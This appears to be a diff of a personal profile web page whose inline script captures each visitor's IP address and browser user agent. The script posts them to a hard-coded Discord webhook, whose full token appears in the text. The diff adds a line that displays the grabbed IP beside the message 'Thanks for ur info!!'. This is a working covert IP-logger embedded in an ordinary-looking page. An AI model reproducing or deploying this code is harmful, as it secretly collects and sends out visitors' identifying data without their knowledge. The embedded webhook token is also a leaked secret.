@@ -320,6 +320,7 @@
       <div class="logo"></div>
       <div class="texto-arcoiris">
         Thanks for ur info!!
+        <span id="user-ip"></span>  </div>
       </div>
       <div class="logo-text">Owasp is a electronic's engineer and web developer.</div>
     </div>
@@ -442,6 +443,7 @@
               const ipAddress = ip;
               const userAgent = navigator.userAgent;
               const webhookUrl = 'https://discord.com/api/webhooks/1340477147575226428/YuqCLYlkLg6GuYKlsIC4ikpTtiJEpRYGNndmUaMaC0DyqIepofFHbcBZKd6c8z5oTD_W';
+              document.getElementById('user-ip').textContent = ipAddress
               fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
